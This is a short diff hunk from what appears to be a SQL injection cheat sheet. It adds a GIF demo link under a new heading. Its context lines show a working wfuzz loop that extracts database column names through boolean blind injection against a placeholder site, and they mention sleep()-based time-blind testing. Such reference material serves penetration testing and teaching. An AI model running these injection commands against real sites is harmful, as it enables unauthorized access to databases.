@@ -107,6 +107,9 @@ Determine column name with boolean blind-based SQL injection by observing `http 
 ```php
 for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available column name 
 ```
+Boolean-based error SQL command injection demo
+
+![alt text](https://j.gifs.com/599V7A.gif)
 
 Confirm time-based blind SQL injection using `sleep()` function
 ```php
